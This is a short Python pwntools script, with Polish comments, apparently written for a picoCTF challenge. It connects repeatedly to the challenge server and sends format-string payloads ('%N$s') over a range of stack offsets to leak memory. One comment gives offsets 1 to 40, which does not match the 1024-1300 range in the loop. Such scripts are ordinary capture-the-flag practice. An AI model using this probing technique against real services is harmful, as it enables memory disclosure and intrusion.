from pwn import *

# Parametry połączenia
host = 'mimas.picoctf.net'
port = 51296

# Funkcja testująca różne offsety
def test_offsets():
    for i in range(1024,1300):  # Testujemy offsety od 1 do 40
        try:
            conn = remote(host, port)

            # Odbierz i wyświetl powitalny komunikat
            print(conn.recv().decode('utf-8'))

            conn.sendline(f"%{i}$s".encode())

            # Odbierz i wyświetl odpowiedź
            response = conn.recv(timeout=5)  # Odbieranie odpowiedzi z timeoutem
            print(f"Offset {i}: {response.decode('utf-8')}")

            # Zamknij połączenie
            conn.close()
        except Exception as e:
            # Obsłuż wszelkie błędy, które mogą wystąpić
            print(f"Offset {i}: Błąd - {str(e)}")

# Uruchom testowanie
if __name__ == "__main__":
    test_offsets()

